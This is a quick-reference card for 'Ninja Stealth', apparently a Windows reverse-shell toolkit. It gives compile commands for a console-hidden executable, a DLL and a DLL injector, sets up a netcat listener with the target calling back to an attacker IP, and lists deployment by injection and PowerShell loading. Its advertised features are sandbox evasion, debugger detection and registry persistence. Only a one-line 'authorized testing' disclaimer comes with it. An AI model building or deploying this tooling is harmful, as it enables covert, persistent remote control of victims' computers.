# 🥷 Ninja Stealth Quick Reference Card

## 🔧 Compilation Commands

### Standard Executable
```bash
g++ -o Ninja-Stealth.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

### Stealth Executable (No Console)
```bash
g++ -mwindows -static -o Ninja-Stealth-Netcat-Static.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

### DLL Version
```bash
g++ -shared -o Ninja-Stealth-DLL.dll Ninja-Stealth-DLL.cpp -lws2_32 -lwinhttp -std=c++11
```

### DLL Loader
```bash
g++ -o Ninja-DLL-Loader.exe Ninja-DLL-Loader.cpp -std=c++11
```

## 🎯 Quick Start (Netcat)

1. **Start Listener:**
   ```bash
   nc -lvnp 44895
   ```

2. **Configure IP:**
   ```cpp
   // In Reverse-Shell.cpp
   std::string ip = "YOUR_IP_HERE";
   int port = 44895;
   ```

3. **Compile & Run:**
   ```bash
   g++ -mwindows -static -o Ninja-Stealth-Netcat-Static.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
   ```

## 📁 File Structure

```
src/                    # Source code
├── Reverse-Shell.cpp # Main executable
├── Ninja-Stealth-DLL.cpp
└── Ninja-DLL-Loader.cpp

bin/                    # Compiled binaries
├── Ninja-Stealth-Netcat-Static.exe
├── Ninja-Stealth-DLL.dll
└── Ninja-DLL-Loader.exe

docs/                   # Documentation
├── DEPLOYMENT.md
├── DLL-DEPLOYMENT.md
├── Load-Ninja-DLL.ps1
└── QUICK-REFERENCE.md
```

## ⚙️ Configuration

### Network Settings
```cpp
std::string ip = "192.168.0.1";  // Your IP
int port = 4444;                  // Your port
```

### Features
- ✅ **Stealth Mode**: Console hidden (`-mwindows`)
- ✅ **Netcat Compatible**: Plain text communication
- ✅ **PowerShell Integration**: Commands wrapped in PowerShell
- ✅ **Anti-Analysis**: Debugger detection, sandbox evasion
- ✅ **Persistence**: Registry auto-start
- ✅ **DLL Injection**: Multiple loading methods

## 🚀 Deployment Methods

### 1. Executable
```bash
Ninja-Stealth-Netcat-Static.exe
```

### 2. DLL via PowerShell
```powershell
.\Load-Ninja-DLL.ps1
```

### 3. DLL Injection
```bash
Ninja-DLL-Loader.exe Ninja-Stealth-DLL.dll
```

### 4. Manual DLL Loading
```powershell
[Reflection.Assembly]::LoadFrom("Ninja-Stealth-DLL.dll")
[NinjaStealth]::StartNinjaStealth()
```

## 🔍 Troubleshooting

| Issue | Solution |
|-------|----------|
| **Connection Failed** | Check firewall, IP, port |
| **Compilation Error** | Install MinGW-w64, check headers |
| **DLL Load Failed** | Match architecture (x86/x64) |
| **Console Visible** | Use `-mwindows` flag |
| **Garbled Output** | Use netcat-compatible build |

## 🛡️ Security Notes

- **For authorized testing only**
- **Use in controlled environments**
- **Clean up after testing**
- **Monitor for unexpected behavior**

## 📞 Support

- Check `DEPLOYMENT.md` for detailed instructions
- See `DLL-DEPLOYMENT.md` for DLL-specific help
- Review compilation commands above

---


*Keep this card handy for quick deployment!* 🥷
